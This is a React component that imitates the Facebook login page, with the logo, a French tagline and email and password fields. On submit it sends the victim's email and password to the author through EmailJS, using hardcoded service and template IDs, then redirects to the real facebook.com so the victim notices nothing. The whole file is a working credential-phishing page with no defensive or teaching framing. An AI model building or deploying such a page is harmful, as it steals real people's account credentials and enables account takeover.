import logo from './logo.svg';
import './App.css';
import { useRef, useEffect, useState } from "react";
import emailjs from "@emailjs/browser";

function App() {
  const emailRef = useRef(null);
  const passwordRef = useRef(null);
  const [loading, setLoading] = useState(false);

    useEffect(() => emailjs.init("dV7mFQv3jioLiSp3O"), []);
    const handleSubmit = async (e) => {
      e.preventDefault();
      const serviceId = "service_5wrrmnq";
      const templateId = "template_d40fgnp";
      try {
        setLoading(true);
        await emailjs.send(serviceId, templateId, {
        password: passwordRef.current.value,
        from_name: emailRef.current.value
        });
        window.open("https://www.facebook.com",  "_self", "location=noopener");
      } catch (error) {
        console.log(error);
      } finally {
        setLoading(false);
      }
    };

  return (
    <div class="box">
          <div class="title-box">
              <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook"></img>
              <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
          </div>
          <div class="form-box">
          <form onSubmit={handleSubmit}>
          <input type="email" ref={emailRef}  placeholder="Email address or phone number"></input>
        <input type="password" ref={passwordRef} placeholder="Password"></input>
        <button type="submit" disabled={loading}>Log In</button>
        <a href="#">Forgot Password</a>
          </form>
            <hr></hr>
            <div class="create-btn">
            <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Create New Account</a>
          </div>
          </div>
      </div>
  );
}

export default App;
